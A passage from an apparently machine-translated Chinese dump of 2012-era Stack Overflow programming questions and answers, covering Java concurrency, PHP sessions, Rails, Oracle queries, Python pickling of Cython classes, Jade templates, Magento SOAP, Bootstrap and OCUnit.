`ConcurrentHashMap`对于线程应用程序更有效。

* * *

## 回答 #2

> 赞同：125
> 
> 时间：2012-09-28T19:48:12.277

`ConcurrentHashMap`使用多个桶来存储数据。这避免了读锁，并大大提高了性能`HashTable`。两者都是线程安全的，但使用`ConcurrentHashMap`.

当您从`ConcurrentHashMap`using中读取时`get()`，没有锁，这与`HashTable`所有操作都只是同步的相反。 `HashTable`是在旧版本的 Java 中发布的，而`ConcurrentHashMap`它是 Java 5+ 的东西。

`HashMap`是在单线程应用程序中使用的最佳选择。

# php - 多个页面中的 PHP Session 变量

> ID：12646413
> 
> 赞同：0
> 
> 时间：2012-09-28T19:46:30.340
> 
> 标签：php, session

所以，这里有page1.php：

```
<form action="action_form.php" method="post">
<select name="font_syle">
<option value="tahoma">Tahoma</option>
<option value="arial">Arial</option>
</select>
<input type="submit" value="Done" />
</form> 
```

这里 action_form.php：

```
<?php
session_start();
$font_style = $_POST["font_syle"];
$_SESSION["font_syle"] = $font_style;
if($_SESSION["font_syle"] == 'tahoma') $font_style = 10;
else if($_SESSION["font_syle"] == 'arial') $font_style = 20;

$total = $font_style;

echo $total;
?> 
```

而这里 page.php

```
<?php 
ob_start();
include 'action_form.php';
ob_end_clean();

echo $total;
?> 
```

我不知道为什么 page.php 上没有打印“$total”的值

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:51:14.707

page.php 包括`action_form.php`. 这将值设置`$font_style`为：

```
$font_style = $_POST["font_syle"]; 
```

由于 page.php 不只是通过表单发布，因此它设置`$font_style`为空字符串。所以当你来回应它时，没有什么可以回应的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:51:00.750

您可以`echo $_SESSION["font_syle"];`在 page.php 中进行打印

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T19:52:59.207

原因是您的表单将`action_form.php`数据存储在变量`$_SESSION`中。

当您打开`page.php`数据时不再存在，因为`$total`不会在页面之间移动。

这里的解决方案是改变：

```
<form action="action_form.php" method="post"> 
```

为了

```
<form action="page.php" method="post"> 
```

或者

而是打印出会话变量。

# ruby-on-rails - 未定义的方法'each for nil:NilClass

> ID：12646414
> 
> 赞同：1
> 
> 时间：2012-09-28T19:46:33.877
> 
> 标签：ruby-on-rails

我正在开发一个当前正在使用的系统，并且出现了一个不经常使用的功能的错误。

```
NoMethodError in Offer_receipts#index

Showing /Users....../app/views/offer_receipts/index.html.erb where   line #8 raised:

undefined method `each' for nil:NilClass
Extracted source (around line #8):

5:     <th>Patron</th>
6:     <th>One Time Offer</th>
7:   </tr>
8:   <% for offer_receipt in @offer_receipts %>
9:     <tr>
10:       <td><p> popld</p></td>
11:       <td><%= offer_receipt.patron_id %></td> 
```

当前正在显示此部分渲染页面时会发生此错误：

```
<h2>Offers</h2>
<div id="offers">
<% if @offers.count > 0 %>
 < % @offers.each do |o| %>  
    <%= show_one_time_offer(o, @patron) %>
  <% end %>

<% else %>
  <strong>There are no offers currently available</strong>

<% end %>
</div> 
```

单击一次性优惠后，将加载此页面，这是发生错误的页面：

index.html.erb

```
<% title "Offer Receipts" %>

<table>
  <tr>
    <th>Patron</th>
    <th>One Time Offer</th>
  </tr>
  <% for offer_receipt in @offer_receipts %>
    <tr>
      <td><%= offer_receipt.patron_id %></td>
      <td><%= offer_receipt.one_time_offer_id %></td>
      <td><%= link_to "Show", offer_receipt %></td>
      <td><%= link_to "Edit", edit_offer_receipt_path(offer_receipt) %></td>
      <td><%= link_to "Destroy", offer_receipt, :confirm => 'Are you sure?', :method => :delete %></td>
    </tr>
  <% end %>
</table>

<p><%= link_to "New Offer Receipt", new_offer_receipt_path %></p> 
```

这里还有另外两个文件，它们定义了 One Time Offer 收据的方法和范围

offer_receipt.rb

```
class OfferReceipt < ActiveRecord::Base
  belongs_to :patron
  belongs_to :one_time_offer
  validates :patron, :presence=>true
  validates :one_time_offer, :presence=>true
  require 'offer_receipt_validator.rb'
  validates_with OfferReceiptValidator

end 
```

offer_receipts_controller.rb

```
class OfferReceiptsController < ApplicationController
  def create
    begin
      @patron = Patron.find(params[:patron])
    rescue ActiveRecord::RecordNotFound
      flash[:error] = "You must provide a patron for an offer receipt"
      redirect_to root_url
      return
    end
    @offer_receipt = OfferReceipt.new(:patron_id=>params[:patron], :one_time_offer_id=>params[:one_time_offer])
    if @offer_receipt.save && @patron
      redirect_to @patron, :notice => "Recorded offer receipt"
    else
      flash[:error] = "There was a problem saving your offer receipt"
      redirect_to @patron
    end
  end
end 
```

还有其他 index.html.erb 文件用于列出每个循环完全相同的其他内容，并且它们工作正常。我还检查了数据库，有超过 2000 行，所以这不是问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-20T03:07:37.850

您的实例变量`@offer_receipt`未在`#index`控制器操作中设置。

您应该添加`#index`操作。像这样的东西应该工作：

```
class OfferReceiptsController < ApplicationController 
  def index
    @offer_receipts = OfferReceipt.all
  end
end 
```

您还可以在`#index`操作中添加其他逻辑。例如，您可能希望将实例变量的范围限定为 a `current_user`。

```
@offer_receipts = OfferReceipt.where(:user_id => current_user.id) 
```

# java - 这是什么摆动组件？

> ID：12646417
> 
> 赞同：0
> 
> 时间：2012-09-28T19:46:42.253
> 
> 标签：java, swing

想知道用箭头标记的 swing 组件是什么，或者它可能是自定义小部件实现吗？

![在此处输入图像描述](../Images/113b7b4dfef046a29dfbf45cabada6e7.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T20:01:39.610

SwingSet3 的源代码可在线获取。查看[`GridBagLayoutDemo`](http://java.net/projects/swingset3/sources/svn/content/trunk/SwingSet3/src/com/sun/swingset3/demos/gridbaglayout/GridBagLayoutDemo.java?rev=219)类，您可以看到该组件是一个`JFrame`.

# vb.net - 从存在的对偶中选择 1（选择 ....）。即使表完全为空，也返回 1？

> ID：12646418
> 
> 赞同：0
> 
> 时间：2012-09-28T19:46:43.663
> 
> 标签：vb.net, oracle

我正在使用 Select 1 from dual 语句来查看进入我的系统的新数据是否真的是新的，如果是新的，那么它将被插入，如果不是，那么它将在数据库中更新。

```
sql.CommandText = "select 1 from dual where exists (select * from my table where hour = " + hour + " and zone = '" + zone+ "' and date = TO_DATE('" + mydate + "','DD-MM-YY'))" 
```

然而问题是，在运行语句后，即使不满足条件，即使表完全为空，它也会返回 1 值。这怎么可能发生？我正在使用 VB、.NET 框架 3.5 和 Oracle 10g。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:39:33.480

我会建议像

```
SELECT COUNT(*) AS cnt 
  FROM mytable m
 WHERE m.hour = hour 
   AND m.zone = zone
   AND m.date = TO_DATE( mydate,'DD-MM-YY'))
   AND ROWNUM = 1 
```

结果将是 0 或 1。由于您只关心行的存在，因此`ROWNUM = 1`将导致查询在找到匹配条目后立即退出，并阻止您扫描整个表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:20:27.137

您可以使用`sign(count(1))`来获取计数。

```
select sign(count(1)) cnt 
from my_table 
where hour = " + hour + " and zone = '" + zone+ "' 
    and date = TO_DATE('" + mydate + "','DD-MM-YY'))" 
```

# python - 如何在python上输入密码？

> ID：12646435
> 
> 赞同：0
> 
> 时间：2012-09-28T19:47:55.963
> 
> 标签：python

> **可能重复：**
> [在 Python 中获取命令行密码输入](https://stackoverflow.com/questions/9202224/getting-command-line-password-input-in-python)

我想知道如何在 python 上输入密码，如果你不知道我在说什么，我的意思是如果我输入类似“hello”的内容，它会添加“*****”而不是像你在输入一样在密码中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:53:29.040

看[`getpass`](http://docs.python.org/library/getpass.html)。您可以将其用作：

```
from getpass import getpass
passwd = getpass() 
```

但是，它不打印星星。

# python - 泡菜cython类

> ID：12646436
> 
> 赞同：13
> 
> 时间：2012-09-28T19:47:58.940
> 
> 标签：python, class, pickle, cython, reduce

我必须保存并加载一个 cython 类实例。我的 cython 类是这个加上几个方法：

```
import numpy as np
cimport numpy as np
cimport cython    
cdef class Perceptron_avg_my:
    cdef int wlen,freePos
    cdef np.ndarray w,wtot,wac,wtotc #np.ndarray[np.int32_t]
    cdef np.ndarray wmean  #np.ndarray[np.float32_t]    
    cdef public dict fpos    

    def __cinit__(self,np.int64_t wlen=4*10**7):
        self.fpos= dict()
        self.freePos=1
        self.wlen=wlen
        self.w=np.zeros(wlen,np.int32)
        self.wtot=np.zeros(wlen,np.int32)
        self.wac=np.zeros(wlen,np.int32)
        self.wtotc=np.zeros(wlen,np.int32)
        self.wmean=np.zeros(wlen,np.float32)

    cpdef evaluate_noavg(self,list f):
        cdef np.ndarray[np.int32_t] w = self.w
        cdef dict fpos = self.fpos        
        cdef bytes ff
        cdef int i
        cdef long int score=0

        for ff in f:
            i=fpos.get(ff,0)  
            if i != 0: 
                score += w[i]
        return score 
```

我正在考虑使用 cPickle 模块。我知道我必须实现一个 __reduce__(self) 方法，但我有一些问题要找到一个例子并很好地理解文档

我试图将这样的东西添加到 Perceptron_avg_my 但不起作用：

```
 def rebuild(self,l):
        self.fpos=l[0]
        self.freePos=l[1]

    def __reduce__(self):
        #print 'reduce call'
        return (Perceptron_avg_my.rebuild,(self.fpos,self.freePos)) 
```

有什么建议么？非常感谢！！！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-28T21:17:35.003

我不知道你是否找到了它，但是官方 Python 文档有[一个关于腌制扩展类型的部分](https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types)（不幸的是，这个文档似乎没有 Python 3 版本，但它在 Python 3 中的工作方式相同）。

我认为你在这里有三个问题。首先，返回的函数`__reduce__`应该从头开始创建一个新对象并将其返回，而您的`rebuild`函数只是设置一些属性。其次，`__reduce__`must返回的元组本身是可picklable的，作为一种方法，`Perceptron_avg_my.rebuild`是不可picklable的（我认为这在python 3.3或3.4中有望得到修复）。相反，您可以将其转换为模块级函数。最后，参数`(self.fpos,self.freePos)`被单独传递`rebuild`——您不必自己解包元组。

以下似乎对我有用（尽管您可能也想存储其他属性的值，否则它们只会具有由 设置的初始值`__init__`）：

```
#inside the class definition
def __reduce__(self):
    return (rebuild, (self.wlen, self.fpos, self.freePos))

#standalone function
def rebuild(wlen, fpos, freePos):
    p = Perceptron_avg_my(wlen)
    p.fpos = fpos
    p.freePos = freePos
    return p 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-07-26T11:40:37.087

从 Cython 0.26（2017 年 7 月发布）开始，不再需要实现 pickle 协议。所有不包含指针或联合的 cdef 类都可以自动腌制。对于包含结构的类，由于（除其他原因）高代码开销，默认情况下禁用自动酸洗。可以使用`@cython.auto_pickle(True)`装饰器为具有结构的类启用自动酸洗。

更多信息可以在[更新日志](https://github.com/cython/cython/blob/master/CHANGES.rst#026-2017-07-19)和[Stefan Behnel 的网站](http://blog.behnel.de/posts/whats-new-in-cython-026.html)上找到。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-03T16:11:11.703

我使用了这个可行的解决方法，但我不确定它是否是最好的解决方案。

我创建了一个新的支持文件来声明reduce调用的函数（如果我把它放在cython模块中它不起作用）：

```
#perceptron_supp.py

from perceptron import Perceptron

def rebuild_perceptron(wlen,freePos,fpos,w,nw_avg,wtot_avg,wsup_avg,wmean_avg,wtot_my,wac_my,wtotc_my,wmean_my):
    return Perceptron(wlen,True,freePos,fpos,w,nw_avg,wtot_avg,wsup_avg,wmean_avg,wtot_my,wac_my,wtotc_my,wmean_my) 
```

然后我在 cython 模块中导入这个函数：

```
#perceptron.pyx

import numpy as np
cimport numpy as np
cimport cython

#added
from perceptron_supp import rebuild_perceptron

cdef class Perceptron:
    cdef int wlen,freePos
    cdef dict fpos

    cdef np.ndarray w #np.ndarray[np.int32_t]

    cdef int nw_avg
    cdef np.ndarray wtot_avg,wsup_avg #np.ndarray[np.int32_t]
    cdef np.ndarray wmean_avg  #np.ndarray[np.float64_t]

    cdef np.ndarray wtot_my,wac_my,wtotc_my #np.ndarray[np.int32_t]
    cdef np.ndarray wmean_my  #np.ndarray[np.float64_t]

    def __cinit__(self,int wlen=4*10**7,setValues=False,freePos=0,fpos=0,w=0,nw_avg=0,wtot_avg=0,wsup_avg=0,wmean_avg=0,wtot_my=0,wac_my=0,wtotc_my=0,wmean_my=0):
        if not setValues:            
            self.wlen=wlen
            self.freePos=1
            self.fpos= dict()

            self.w=np.zeros(wlen,np.int32)

            self.nw_avg=1
            self.wtot_avg=np.zeros(wlen,np.int32)            
            self.wsup_avg=np.zeros(wlen,np.int32)
            self.wmean_avg=np.zeros(wlen,np.float64)

            self.wtot_my=np.zeros(wlen,np.int32)    
            self.wac_my=np.zeros(wlen,np.int32)
            self.wtotc_my=np.zeros(wlen,np.int32)
            self.wmean_my=np.zeros(wlen,np.float64)
        else:           
            self.wlen=wlen
            self.freePos=freePos
            self.fpos=fpos

            self.w=w

            self.nw_avg=nw_avg
            self.wtot_avg=wtot_avg
            self.wsup_avg=wsup_avg
            self.wmean_avg=wmean_avg

            self.wtot_my=wtot_my
            self.wac_my=wac_my
            self.wtotc_my=wtotc_my
            self.wmean_my=wmean_my

    def __reduce__(self):
        return (rebuild_perceptron,(self.wlen,self.freePos,self.fpos,self.w,self.nw_avg,self.wtot_avg,self.wsup_avg,self.wmean_avg,self.wtot_my,self.wac_my,self.wtotc_my,self.wmean_my)) 
```

当我使用我的感知器模块时，我只需要做：从感知器导入感知器，现在我可以在需要时执行 cPyckle.dump 或 cPickle.load。

如果有人有更好的解决方案非常感谢！！！

# python - 如何在python中处理非常大的数字（19位）

> ID：12646437
> 
> 赞同：0
> 
> 时间：2012-09-28T19:48:00.973
> 
> 标签：python, largenumber

在 python 中，我需要能够循环遍历一个 19 位数字；这样做的典型方法是什么？我正在使用 python 2.7.x；但如果有可行的解决方案，将使用 python 3.x。

我有很多；`1000**5`（甚至更大`1000**10`）例如；我需要在 for 循环中循环浏览这个数字列表。我知道这需要时间；但是因为我找不到一种方法来循环这么大的数字，所以我很茫然。

我在 python 2.7 中尝试过 , 和 并`xrange`收到`range`错误。`itertools.islice``Overflow`

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:01:50.077

以下适用于 python 3.x：

python中的`int`类型没有限制。如果你想遍历 0,1,2...n 其中 n 是一个 19 位数字，你可以这样做：

```
for i in range(n):
    pass #whatever you like 
```

虽然这需要很长时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T20:29:42.217

不如 for 漂亮，但只需使用 while() 即可解决问题（而且它适用于任何版本的 Python）：

```
i=0
while (i<1000**10):
    i += 1
    # do some stuff 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:07:40.150

如果您尝试迭代单个数字：

```
long_int_string = '34234345456575657'
for digit in [int(x) for x in long_int_string]:
    # do something useful with digit        
    print digit 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T20:08:59.573

听起来您想遍历整数的各个数字。对于这样的情况，知道它`x % 10`等于以`x`十为底的正整数的最右边的数字是很有用的。考虑到这一点，您可以通过迭代地使用模数并减少数字来获得每个数字。

```
def splitIntoDigits(x):
    digits = []
    while x != 0:
        digits.insert(0, int(x%10))
        x /= 10
    return digits

print splitIntoDigits(15016023042)
[1, 5, 0, 1, 6, 0, 2, 3, 0, 4, 2] 
```

此外，喜剧单行答案：

```
>>> [int(num/(10**x)%10) for x in range(int(math.log(num,10)),-1,-1)]
[1, 5, 0, 1, 6, 0, 2, 3, 0, 4, 2] 
```

# api - 我/照片和相册没有返回所有照片

> ID：12646440
> 
> 赞同：2
> 
> 时间：2012-09-28T19:48:27.733
> 
> 标签：api, facebook-graph-api, graph, photos

当我向我/照片提出请求时，我应该期望得到所有我被标记的照片。但是，我没有得到这种行为。JSON 结果中似乎缺少一些图片。当我去 FB 时，它们对我来说是可见的。

这也发生在一些专辑中。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-01T15:43:14.140

[Facebook 的应用程序设置](https://www.facebook.com/settings?tab=applications)页面允许用户更改他们的内容在其他人使用的应用程序中的曝光率。

截图：http: [//i.stack.imgur.com/vve6b.png](http://i.stack.imgur.com/vve6b.png)

如果我阻止应用程序查看我的照片，当您登录 Facebook 应用程序时，您将无法看到我上传的任何照片。即使我在照片中标记了你，情况仍然如此。

但是，如果您直接访问 Facebook 网站，您将能够看到您被标记的所有照片。

这解释了我们所看到的差异。

使用 2 个 Facebook 帐户进行了测试。

# templates - 玉模板之间如何传递变量

> ID：12646451
> 
> 赞同：54
> 
> 时间：2012-09-28T19:49:03.023
> 
> 标签：templates, variables, pug

我使用模板作为基础，并希望它知道在使用它的页面中设置的一些变量......

文件：template.jade

```
vars = vars || {some:"variables"}
!!! 5
head
    title vars.some 
```

文件：page.jade

```
vars = {some:"things"} //- this does not get used from within template.jade
extends template 
```

我希望编译后的 page.jade 有一个标题“事物”

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2013-06-14T08:11:00.313

我在[这里找到解决方案](https://github.com/visionmedia/jade/issues/654)

带变量的传递块

模板.jade：

```
!!!
html
  block vars
  head
      title #{pageTitle} - default www title
  body 
```

page.jade

```
extends template
block vars
  - var pageTitle = 'Home' 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T11:08:40.337

您可以使用块：

模板.jade：

```
!!! 5
head
    block title
        title variables 
```

page.jade:

```
extends template
block title
    title things 
```

否则，您必须在脚本中定义变量（例如 express）。据我所知，变量只能通过包含传递，但不能向上传递到布局（在您的情况下为 template.jade）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T18:32:53.483

我认为这些块对我不起作用，因为我需要在多个地方使用该变量。

```
// base.jade
pageTitleVar = "Parent's Title"
!!!
title !{pageTitleVar}
h1 !{pageTitleVar} 
```

事实证明，您实际上可以在父模板中指定相同的块两次，并且子模板传递给它的任何内容都会被复制。

```
// base.jade
pageTitleVar = "Parent's Title"
!!!
title
  block pageTitleBlock
    !{pageTitleVar}
h1
  block pageTitleBlock
    !{pageTitleVar}

// child.jade
extends base
pageTitleVar = "Child's Title"
block pageTitleBlock
   !{pageTitleVar} 
```

阻止 FTW

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-01-29T16:26:54.010

一个很棒的评论解决方案来添加这样的标题：
**“我的项目 - 页面”**。

或者只是这个：
**“我的项目”**

模板：template.jade

```
doctype 5
html(lang="en")
head
    //- setting the page title to be dynamic
    block vars
        - var defaultTitle = "My Project"
        - var pageTitle = pageTitle
    title #{defaultTitle}#{pageTitle} 
```

一些页面：page.jade

```
extends base
//- custom page title
block append vars
    pageTitle = " - The Page" 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-02-16T04:05:07.650

如何使用[模板包含](http://learnjade.com/tour/template-includes/)？

```
// vars.jade
- var name = "Chris"
#{ nick = "StackOverflow"  }

// page.jade
doctype html
html
  head
    title= title
    link(rel='stylesheet', href='/stylesheets/style.css')
  body
    h1= title
    include vars
    p Welcome to #{title} #{name} #{nick} 
```

# java - 如何重新打开java应用程序launch4j单实例

> ID：12646452
> 
> 赞同：2
> 
> 时间：2012-09-28T19:49:07.907
> 
> 标签：java, single-instance, launch4j

摘要：通过单击桌面图标使不可见的应用程序再次可见。

我创建了一个 java 桌面应用程序并使用 Launch4j 创建可执行文件。我的应用程序需要作为单个实例运行。我已经在 Launch4j 配置 GUI 中检查该选项实现了这一点。当用户单击我的窗口上的 x 按钮（我正在使用 JFrame）时，窗口将变为不可见。它没有被处置。当用户双击系统托盘图标时，应用程序窗口再次可见。当用户双击应用程序桌面图标并且应用程序已经在运行时，我需要我的主窗口再次可见，就像系统托盘图标的行为一样。

Launch4j 在 Single instance 选项卡下提供了一个窗口标题选项。我认为这个选项可能是为了满足我的需要。但是，当我设置窗口标题并执行上述步骤时，我得到一个空白的白色窗口。在显示空白窗口的情况下，双击我的系统托盘图标将使我的应用程序出现在白色窗口中。这种行为表明，更改与顶级容器（Window、Frame、JFrame）相关的代码可能会产生影响。

您对如何在仍使用 Launch4j 的同时合并此行为有任何想法吗？（很方便）。

编辑：

我的问题的核心是如何定义当用户双击我的可执行桌面图标时会发生什么？如果我可以检查现有实例并将双击重定向到相关的系统托盘图标，那就太棒了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-01T18:11:14.997

我能够实现我的目标。在 Single Instance 选项卡中，我在“Window title”字段中给出了主 JFrame 的标题。然后我在我的主 JFrame 中添加了一个 WindowFocusListener。当我的 JFrame 获得焦点时，我会检查它是否已经可见。如果不是，我调用适当的方法来显示我的 JFrame。

关键观察是，当在设置中给出窗口标题时，双击 Launch4j 生成的 exe 图标会触发窗口焦点事件。我不确定这是否是唯一被触发的事件，但是通过监听该事件，当用户双击桌面图标时，我可以从我的 java 代码中采取任何必要的操作。

# magento - Customer.Create 上的 SOAP Magento 错误

> ID：12646454
> 
> 赞同：0
> 
> 时间：2012-09-28T19:49:14.787
> 
> 标签：magento, soap, axis

我正在尝试从 Magja 项目创建一个客户，而我得到的 AxisFault 是 100 个“需要客户电子邮件”。. 我从 1.7 文档中传递了正确的最低要求参数。长话短说，我的错误代码说我不包括我的电子邮件，但它显然在那里（没有将敏感信息放在 SO 上......所以你只需要相信我:)）。有任何想法吗？

```
Stack
org.eclipse.debug.core.DebugException: com.sun.jdi.ClassNotLoadedException: Type has not been loaded occurred while retrieving component type of array.

//soapclient line 208
result = sender.sendReceive(method)  -> method variable

<mag:call xmlns:mag="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-XML="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <sessionId>9be685563680f52c1ab5375bec545dfe</sessionId>
    <resourcePath>customer.create</resourcePath>
    <args SOAP-ENC:arrayType="xsd:ur-type[1]" xsi:type="SOAP-ENC:Array">
        <item SOAP-ENC:arrayType="xsd:ur-type[1]" xsi:type="SOAP-ENC:Array">
            <item xsi:type="SOAP-XML:Map">
                <item>
                    <key xsi:type="xsd:string">email</key>
                    <value xsi:type="xsd:string">MY EMAIL</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">password_hash</key>
                    <value xsi:type="xsd:string">4cb9c8a8048fd02294477fcb1a41191a</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">group_id</key>
                    <value xsi:type="xsd:int">1</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">store_id</key>
                    <value xsi:type="xsd:int">1</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">lastname</key>
                    <value xsi:type="xsd:string">LName</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">firstname</key>
                    <value xsi:type="xsd:string">Fname</value>
                </item>
                <item>
                    <key xsi:type="xsd:string">website_id</key>
                    <value xsi:type="xsd:int">1</value>
                </item>
            </item>
        </item>
    </args>
</mag:call>

//magentosoapclient line 215
throw axisFault (axisfault -> message)
<?xml version='1.0' encoding='utf-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Body>
        <SOAP-ENV:Fault>
            <faultcode>100</faultcode>
            <faultstring>Customer email is required</faultstring>
        </SOAP-ENV:Fault>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:05:31.617

您需要在 Magento 结束时跟踪/记录数据。不知何故，电子邮件在此过程中丢失和/或丢失。为创建客户而调用的 PHP 代码位于

```
#File: app/code/core/Mage/Customer/Model/Customer/Api.php
public function create($customerData)
{
    $customerData = $this->_prepareData($customerData);
    try {
        $customer = Mage::getModel('customer/customer')
            ->setData($customerData)
            ->save();
    } catch (Mage_Core_Exception $e) {
        $this->_fault('data_invalid', $e->getMessage());
    }
    return $customer->getId();
} 
```

并且发送回您的 SOAP 客户端的特定异常位于

```
#File: app/code/core/Mage/Customer/Model/Resource/Customer.php
protected function _beforeSave(Varien_Object $customer)
{
    parent::_beforeSave($customer);

    if (!$customer->getEmail()) {
        throw Mage::exception('Mage_Customer', Mage::helper('customer')->__('Customer email is required'));
    } 
```

您的客户电话和/或您正在使用的特定 Magento 系统有一些东西使 Magento 认为没有设置客户电子邮件。几个电话`Mage::Log`应该会让你走上正确的道路。

# javascript - 手风琴不会塌陷

> ID：12646455
> 
> 赞同：10
> 
> 时间：2012-09-28T19:49:15.923
> 
> 标签：javascript, twitter-bootstrap, accordion, collapse

以下手风琴代码对我来说无法正常工作。

```
<div class="accordion" id="accordion1">
    <div class="accordion-group">
      <div class="accordion-heading">
        <a class="accordion-toggle" data-toggle="collapse"
           data-parent="#accordion1" href="#note1">
          Foo
        </a>
      </div>
      <div class="accordion-body collapse" id="note1">
        <div class="accordion-inner">
          <pre>Foo body</pre>
        </div>
      </div>
    </div>
    <div class="accordion-group">
      <div class="accordion-heading">
        <a class="accordion-toggle" data-toggle="collapse"
           data-parent="#accordion1" href="#note2">
          Bar
        </a>
      </div>
      <div class="accordion-body collapse" id="note2">
        <div class="accordion-inner">
          <pre>Bar body</pre>
        </div>
      </div>
    </div>
</div> 
```

它显示并且项目正确展开，但项目不会折叠。当我单击一个打开的项目时，它会短暂折叠，然后再次展开。我在引导程序版本 2.1.0 和 2.1.1 上看到了这种行为。另外，我正在使用 JQuery 1.7.2 和 1.8.2 并在 Chrome 22 中查看。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-10-01T17:50:16.497

问题最终是我不小心包含了我所有的 javascript 脚本文件两次。删除副本修复了一切。我不知道这个错误有多普遍，但是如果将来其他人遇到这个问题，那么得到这个答案而不是仅仅删除问题可能会有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-09T20:26:52.340

我有同样的问题。问题是我在引导**后加载了 jQuery。**

# jackrabbit - DocViewProperty XML 序列化

> ID：12646458
> 
> 赞同：1
> 
> 时间：2012-09-28T19:49:26.837
> 
> 标签：jackrabbit, jcr, aem, sling

DocViewProperty#format 可用于将 Java 字符串序列化为 JCR docview XML 格式。但是，该方法的输出似乎仍然尊重回车/换行，而不是使用十六进制转义控制字符。这意味着即使在我使用 DocViewProperty#format 之后，我也不一定会获得与 CQ5 包中的 .content.xml 文件中可能显示的字符串相同的字符串——其中空格被转义。序列化机制中的什么执行该工作，我如何使用它而不是自己汇总它的近似值？

# objective-c - 为什么这个 OCUnit 测试失败了？

> ID：12646470
> 
> 赞同：0
> 
> 时间：2012-09-28T19:50:06.140
> 
> 标签：objective-c, ios, mocking, tdd, ocunit

它正在进入主视图控制器的 ViewDidLoad，并点击调用获取所有推文的行，但我在基础和派生的 getAllTweets 中放置了一个断点，以查看它是否没有像我预期的那样击中派生。

```
@implementation WWMainViewControllerTests {

    // system under test
    WWMainViewController *viewController;

    // dependencies
    UITableView *tableViewForTests;
    WWTweetServiceMock *tweetServiceMock;    
}

- (void)setUp {

    tweetServiceMock = [[WWTweetServiceMock alloc] init];
    viewController = [[WWMainViewController alloc] init];
    viewController.tweetService = tweetServiceMock;
    tableViewForTests = [[UITableView alloc] init];
    viewController.mainTableView = tableViewForTests;
    tableViewForTests.dataSource = viewController;
    tableViewForTests.delegate = viewController;
}

- (void)test_ViewLoadedShouldCallServiceLayer_GetAllTweets {

    [viewController loadView];
    STAssertTrue(tweetServiceMock.getAllTweetsCalled, @"Should call getAllTweets on tweetService dependency");
}

- (void)tearDown {

    tableViewForTests = nil;
    viewController = nil;
    tweetServiceMock = nil;
} 
```

基础推文服务：

```
@implementation WWTweetService {

    NSMutableArray *tweetsToReturn;
}

- (id)init {

    if (self = [super init]) {
        tweetsToReturn = [[NSMutableArray alloc] init];
    }

    return self;
}
- (NSArray *)getAllTweets {

    NSLog(@"here in the base of get all tweets");
    return tweetsToReturn;
}

@end 
```

模拟推文服务：

```
@interface WWTweetServiceMock : WWTweetService

@property BOOL getAllTweetsCalled;

@end

@implementation WWTweetServiceMock

@synthesize getAllTweetsCalled;

- (id)init {

    if (self = [super init]) {
        getAllTweetsCalled = NO;
    }

    return self;
}

- (NSArray *)getAllTweets {

    NSLog(@"here in the mock class.");
    getAllTweetsCalled = YES;
    return [NSArray array];
} 
```

被测主视图控制器：

```
@implementation WWMainViewController
@synthesize mainTableView = _mainTableView;
@synthesize tweetService;

NSArray *allTweets;

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

    allTweets = [tweetService getAllTweets];
    NSLog(@"was here in view controller");
}

- (void)viewDidUnload
{
    [self setMainTableView:nil];
    [super viewDidUnload];
    // Release any retained subviews of the main view.
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:11:46.410

既然您能够在 中中断调试器`viewDidLoad`，那么`tweetService`ivar 的值是多少？如果是`nil`，则该`getAllTweets`消息将只是无操作。也许 ivar 没有被正确设置或在其他地方被覆盖。

您可能应该使用该属性来访问`tweetService`(call `self.tweetService`) 而不是其底层 ivar。您应该只在 getter、setter 中直接访问 ivar，并且`init`（`dealloc`如果出于某种疯狂的原因不使用 ARC）。

您也不应该调用`loadView`自己，而只是访问`view`视图控制器的属性。这将启动加载过程并调用`viewDidLoad`.

此外，如果您要进行大量模拟，我强烈推荐[OCMock](http://ocmock.org/)。

# ruby - 去掉小数点

> ID：12646472
> 
> 赞同：15
> 
> 时间：2012-09-28T19:50:09.643
> 
> 标签：ruby

我需要比较一个数据集，其中一批数据带有带小数的货币，例如 246.54 新数据删除了小数，不四舍五入，只有 246 ......所以我需要从第一个中删除小数批次，所以我可以比较。如果不四舍五入，我将如何做到这一点？

* * *

## 回答 #1

> 赞同：22
> 
